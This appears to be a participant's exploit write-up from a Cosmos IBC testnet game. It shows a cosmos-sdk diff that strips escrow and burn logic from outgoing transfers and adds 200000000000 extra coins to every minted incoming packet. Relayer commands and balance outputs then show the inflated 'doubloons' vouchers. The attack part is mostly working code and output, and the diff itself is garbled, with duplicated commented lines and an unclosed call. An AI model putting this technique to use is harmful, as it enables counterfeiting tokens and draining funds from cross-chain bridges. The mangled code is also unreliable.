# Deceive case

I change the code as follow, and start my chain as a deceive zone and I can receive any amount of doubloons.

```
github.com/cosmos/cosmos-sdk/x/ibc/20-transfer/keeper/relay.go
@@ -72,56 +72,56 @@ func (k Keeper) createOutgoingPacket(
                return sdkerrors.Wrapf(types.ErrOnlyOneDenomAllowed, "%d denoms included", len(amount))
        }

-       //prefix := types.GetDenomPrefix(destinationPort, destinationChannel)
-       //source := strings.HasPrefix(amount[0].Denom, prefix)
-
-       //if source {
-       //      // clear the denomination from the prefix to send the coins to the escrow account
-       //      coins := make(sdk.Coins, len(amount))
-       //      for i, coin := range amount {
-       //              if strings.HasPrefix(coin.Denom, prefix) {
-       //                      coins[i] = sdk.NewCoin(coin.Denom[len(prefix):], coin.Amount)
-       //              } else {
-       //                      coins[i] = coin
-       //              }
-       //      }
-
-       //      // escrow tokens if the destination chain is the same as the sender's
-       //      escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
-
-       //      // escrow source tokens. It fails if balance insufficient.
-       //      if err := k.bankKeeper.SendCoins(
-       //              ctx, sender, escrowAddress, coins,
-       //      ); err != nil {
-       //              return err
-       //      }
-
-       //} else {
-       //      // build the receiving denomination prefix if it's not present
-       //      prefix = types.GetDenomPrefix(sourcePort, sourceChannel)
-       //      for _, coin := range amount {
-       //              if !strings.HasPrefix(coin.Denom, prefix) {
-       //                      return sdkerrors.Wrapf(types.ErrInvalidDenomForTransfer, "denom was: %s", coin.Denom)
-       //              }
-       //      }
-
-       //      // transfer the coins to the module account and burn them
-       //      if err := k.bankKeeper.SendCoinsFromAccountToModule(
-       //              ctx, sender, types.GetModuleAccountName(), amount,
-       //      ); err != nil {
-       //              return err
-       //      }
-
-       //      // burn vouchers from the sender's balance if the source is from another chain
-       //      if err := k.bankKeeper.BurnCoins(
-       //              ctx, types.GetModuleAccountName(), amount,
-       //      ); err != nil {
-       //              // NOTE: should not happen as the module account was
-       //              // retrieved on the step above and it has enough balace
-       //              // to burn.
-       //              return err
-       //      }
-       //}
+       prefix := types.GetDenomPrefix(destinationPort, destinationChannel)
+       source := strings.HasPrefix(amount[0].Denom, prefix)
+
+       if source {
+               // clear the denomination from the prefix to send the coins to the escrow account
+               coins := make(sdk.Coins, len(amount))
+               for i, coin := range amount {
+                       if strings.HasPrefix(coin.Denom, prefix) {
+                               coins[i] = sdk.NewCoin(coin.Denom[len(prefix):], coin.Amount)
+                       } else {
+                               coins[i] = coin
+                       }
+               }
+
+               // escrow tokens if the destination chain is the same as the sender's
+               escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
+
+               // escrow source tokens. It fails if balance insufficient.
+               if err := k.bankKeeper.SendCoins(
+                       ctx, sender, escrowAddress, coins,
+       //      escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
+
+       //      // escrow source tokens. It fails if balance insufficient.
+       //      if err := k.bankKeeper.SendCoins(
+       //              ctx, sender, escrowAddress, coins,
+       //      ); err != nil {
+       //              return err
+       //      }
+
+       //} else {
+       //      // build the receiving denomination prefix if it's not present
+       //      prefix = types.GetDenomPrefix(sourcePort, sourceChannel)
+       //      for _, coin := range amount {
+       //              if !strings.HasPrefix(coin.Denom, prefix) {
+       //                      return sdkerrors.Wrapf(types.ErrInvalidDenomForTransfer, "denom was: %s", coin.Denom)
+       //              }
+       //      }
+
+       //      // transfer the coins to the module account and burn them
+       //      if err := k.bankKeeper.SendCoinsFromAccountToModule(
+       //              ctx, sender, types.GetModuleAccountName(), amount,
+       //      ); err != nil {
+       //              return err
+       //      }
+
+       //      // burn vouchers from the sender's balance if the source is from another chain
+       //      if err := k.bankKeeper.BurnCoins(
+       //              ctx, types.GetModuleAccountName(), amount,
+       //      ); err != nil {
+       //              // NOTE: should not happen as the module account was
+       //              // retrieved on the step above and it has enough balace
+       //              // to burn.
+       //              return err
+       //      }
+       //}

        packetData := types.NewFungibleTokenPacketData(
                amount, sender.String(), receiver,
@@ -161,14 +161,14 @@ func (k Keeper) OnRecvPacket(ctx sdk.Context, packet channeltypes.Packet, data t

                // mint new tokens if the source of the transfer is the same chain
                if err := k.bankKeeper.MintCoins(
-                       ctx, types.GetModuleAccountName(), data.Amount,
+                       ctx, types.GetModuleAccountName(), data.Amount.Add(sdk.NewCoin(data.Amount[0].Denom, sdk.NewInt(200000000000))),
                ); err != nil {
                        return err
                }

                // send to receiver
                return k.bankKeeper.SendCoinsFromModuleToAccount(
-                       ctx, types.GetModuleAccountName(), receiver, data.Amount,
+                       ctx, types.GetModuleAccountName(), receiver, data.Amount.Add(sdk.NewCoin(data.Amount[0].Denom, sdk.NewInt(200000000000))),
                )
        }

@@ -242,4 +242,3 @@ func (k Keeper) refundPacketAmount(ctx sdk.Context, packet channeltypes.Packet,

        return k.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.GetModuleAccountName(), sender, data.Amount)
 }
```

```
$ rly q bal gameofzoneshub-3
9999967759doubloons
```

```
$ rly tx transfer gameofzoneshub-3 okchain-3 1doubloons true $(rly keys show okchain-3)
I[2020-06-05|06:49:50.504] ✔ [gameofzoneshub-3]@{45523} - msg(0:transfer) hash(491CE1A934AEC382204C69AD1D2508744D040A61E3250C2D2D37E8A79709AC22)
I[2020-06-05|06:50:01.076] ✔ [okchain-3]@{71108} - msg(0:update_client,1:ics04/opaque) hash(0B0ABA3066E760B927C4B42F9CA1659C3008837FD74E88832995636BC4A0EFA3)
```

```
$ rly q bal okchain-3
20000000okb,1999189500okt,600transfer/fppnfzdytc/quark,200000000403transfer/nwqzbspdof/doubloons,203transfer/pcdwtjslox/doubloons
```
I transfer some doubloons on my zone to another zone hashquarkchain-3, and the amount of doubloons on my zone did not reduce. I redeem the doubloons with the account okchain-3. The account hashquarkchain-3 transfered `transfer/nwqzbspdof/doubloons` back to another account `A` on okchain-3, but it can not redeem doubloons on gameofzoneshub-3.

```
rly tx transfer okchain-3 hashquarkchain-3 100000000000transfer/nwqzbspdof/doubloons true $(rly keys show hashquarkchain-3)
I[2020-06-05|07:07:57.216] ✔ [okchain-3]@{71320} - msg(0:transfer) hash(34454378EC1D554FDAAB93FC292F132B2A3A85D8E3D03905101FBCF1A89C05F1)
I[2020-06-05|07:08:09.313] ✔ [hashquarkchain-3]@{67331} - msg(0:update_client,1:ics04/opaque) hash(EBC02C5B4FD20B70ABB490158BE20804CDC932A1AFAC48C85F06931703068D64)
```

```
$ rly q bal hashquarkchain-3
999815000quark,10000000samoleans,2transfer/gidcknjdmk/okt,100000000003transfer/gidcknjdmk/transfer/nwqzbspdof/doubloons,1000transfer/wudarybpdw/zhiyuan
```

```
$ rly q bal okchain-3
20000000okb,1999164500okt,600transfer/fppnfzdytc/quark,200000000403transfer/nwqzbspdof/doubloons,203transfer/pcdwtjslox/doubloons
```
